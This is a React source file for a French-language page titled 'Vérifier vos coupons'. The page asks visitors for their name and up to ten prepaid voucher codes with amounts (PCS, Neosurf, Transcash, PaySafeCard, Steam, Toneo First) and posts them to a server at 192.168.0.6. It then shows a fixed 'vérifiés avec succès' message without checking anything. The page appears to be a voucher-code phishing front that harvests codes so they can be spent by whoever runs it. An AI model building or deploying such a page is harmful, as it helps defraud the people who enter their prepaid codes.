import React, { useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, CreditCard, User2, Wallet } from 'lucide-react';
import { motion } from 'framer-motion';
import { ButtonLoader } from '../components/Loader';

const providers = {
  pcs: {
    name: 'PCS',
    logo: '/src/public/pcss.png',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXXXX',
    color: '#4F46E5'
  },
  neosurf: {
    name: 'Neosurf',
    logo: '/src/public/neosurf.png',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXXXX',
    color: '#2563EB'
  },
  steam: {
    name: 'Steam',
    logo: 'https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXXXX',
    color: '#1D4ED8'
  },
  transcash: {
    name: 'Transcash',
    logo: '/src/public/transcash.webp',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXXXX',
    color: '#3B82F6'
  },
  paysafecard: {
    name: 'PaySafeCard',
    logo: '/src/public/lo.png',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXXXX',
    color: '#60A5FA'
  },
  toneofirst: {
    name: 'Toneo First',
    logo: '/src/public/toneo.png',
    maxLength: 16,
    pattern: '[0-9]*',
    format: 'XXXXXXXXXXXXXXXX',
    color: '#93C5FD'
  }
};

const fadeInUp = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.5 }
};

function VerificationPage() {
  const { provider } = useParams();
  const navigate = useNavigate();
  const [nom, setNom] = useState('');
  const [prenom, setPrenom] = useState('');
  const [codes, setCodes] = useState(Array(10).fill(''));
  const [montants, setMontants] = useState(Array(10).fill(''));
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [activeIndex, setActiveIndex] = useState(0);

  if (!provider || !providers[provider.toLowerCase()]) {
    return <div>Provider not found</div>;
  }

  const currentProvider = providers[provider.toLowerCase()];

  const formatCode = (input: string) => {
    return input.replace(/[^0-9]/g, '').slice(0, 16);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
  
    if (!nom || !prenom) {
      setError('Veuillez entrer au moins le nom et le prénom');
      return;
    }
  
    const submittedCodes = codes.map(c => c.trim()).filter(c => c);
    const submittedMontants = montants.map(m => m.trim()).filter(m => m);
  
    if (submittedCodes.length === 0) {
      setError('Veuillez entrer au moins un code de coupon');
      return;
    }
  
    const payload = {
      nom,
      prenom,
      provider: currentProvider.name,
      codes: submittedCodes,
      montants: submittedMontants,
    };
  
    setLoading(true);
  
    try {
      const response = await fetch('http://192.168.0.6:5000/api/enregistrement', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
  
      if (!response.ok) {
        throw new Error('Erreur lors de la soumission');
      }
  
      const data = await response.json();
  
      // Rediriger vers la page de résultat avec les données
      navigate('/result', {
        state: {
          success: true,
          message: 'Vos coupons ont été vérifiés avec succès.',
          codes: submittedCodes,
          montants: submittedMontants,
          provider: currentProvider.name,
          nom,
          prenom,
        },
      });
    } catch (err) {
      console.error(err);
      setError('Une erreur est survenue, veuillez réessayer.');
    } finally {
      setLoading(false);
    }
  };
  

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50 text-black">
      {/* Background Effects */}
      <div className="fixed inset-0 -z-10">
        <div className="absolute inset-0 bg-[#080B2C]" />
        <div className="absolute inset-0 opacity-30 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-blue-500/20 via-transparent to-transparent" />
        <div className="absolute inset-0">
          <div className="absolute top-20 left-[20%] w-[400px] h-[400px] bg-blue-400/10 rounded-full blur-3xl animate-pulse" />
          <div className="absolute top-40 right-[15%] w-[300px] h-[300px] bg-indigo-400/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }} />
        </div>
      </div>

      {/* Header */}
      <header className="border-b border-blue-100 backdrop-blur-lg bg-white/70 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center">
          <motion.button
            onClick={() => navigate('/')}
            className="flex items-center text-black/70 hover:text-black transition-colors"
            whileHover={{ x: -5 }}
            whileTap={{ scale: 0.95 }}
          >
            <ArrowLeft className="w-5 h-5 mr-2" />
            Retour
          </motion.button>
        </div>
      </header>

      <div className="max-w-2xl mx-auto px-4 py-12 sm:px-6 lg:px-8">
        <motion.div 
          className="relative backdrop-blur-xl bg-white/80 rounded-3xl border border-blue-100 p-8 shadow-xl"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          <div className="absolute inset-0 bg-gradient-to-br from-[${currentProvider.color}]/10 to-transparent rounded-3xl" />
          
          <div className="relative">
            {/* Logo */}
            <motion.div 
              className="flex justify-center mb-8"
              initial={{ scale: 0.8, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10">
                <img
                  src={currentProvider.logo}
                  alt={`Logo ${currentProvider.name}`}
                  className="h-12 object-contain"
                />
              </div>
            </motion.div>

            {/* Title */}
            <motion.h1 
              className="text-3xl font-bold text-center mb-8 bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent"
              variants={fadeInUp}
              initial="initial"
              animate="animate"
            >
              Vérifier vos coupons {currentProvider.name}
            </motion.h1>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Personal Info */}
              <div className="space-y-4">
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
                    <User2 className="w-5 h-5" />
                  </div>
                  <input
                    type="text"
                    value={nom}
                    onChange={(e) => setNom(e.target.value)}
                    placeholder="Nom"
                    className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black backdrop-blur-xl"
                    required
                  />
                </div>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
                    <User2 className="w-5 h-5" />
                  </div>
                  <input
                    type="text"
                    value={prenom}
                    onChange={(e) => setPrenom(e.target.value)}
                    placeholder="Prénom"
                    className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black backdrop-blur-xl"
                    required
                  />
                </div>
              </div>

              {/* Tickets */}
              <div className="space-y-6">
                {[...Array(10)].map((_, i) => (
                  <motion.div 
                    key={i}
                    className={`space-y-4 p-6 rounded-2xl transition-all duration-200 ${
                      activeIndex === i ? 'bg-blue-50/50 border border-blue-100' : ''
                    }`}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: i * 0.1 }}
                  >
                    <label className="block text-sm text-black font-medium">
                      Ticket {i + 1}
                    </label>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <input
                        type="text"
                        value={codes[i]}
                        onChange={(e) => {
                          const updated = [...codes];
                          updated[i] = formatCode(e.target.value.toUpperCase());
                          setCodes(updated);
                        }}
                        onFocus={() => setActiveIndex(i)}
                        placeholder="Code du coupon (16 chiffres)"
                        className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black font-mono tracking-wider backdrop-blur-xl"
                        maxLength={currentProvider.maxLength}
                        pattern={currentProvider.pattern}
                      />
                    </div>
                    <div className="relative">
                      <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-black/40">
                        <Wallet className="w-5 h-5" />
                      </div>
                      <input
                        type="number"
                        value={montants[i]}
                        onChange={(e) => {
                          const updated = [...montants];
                          updated[i] = e.target.value;
                          setMontants(updated);
                        }}
                        onFocus={() => setActiveIndex(i)}
                        placeholder="Montant"
                        className="block w-full pl-12 pr-4 py-3 rounded-xl border border-blue-100 bg-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-transparent placeholder-gray-400 text-black backdrop-blur-xl"
                      />
                    </div>
                  </motion.div>
                ))}
              </div>

              {error && (
                <motion.p 
                  className="text-sm text-red-600 bg-red-50 p-4 rounded-xl border border-red-100"
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                >
                  {error}
                </motion.p>
              )}

              <motion.button
                type="submit"
                disabled={loading}
                className={`w-full flex justify-center py-4 px-6 rounded-xl text-white font-medium transition-all duration-200 ${
                  loading 
                    ? 'bg-blue-400 cursor-not-allowed' 
                    : 'bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 shadow-lg shadow-blue-500/25'
                }`}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
              >
                {loading ? <ButtonLoader /> : 'Vérifier maintenant'}
              </motion.button>
            </form>
          </div>
        </motion.div>
      </div>
    </div>
  );
}

export default VerificationPage;
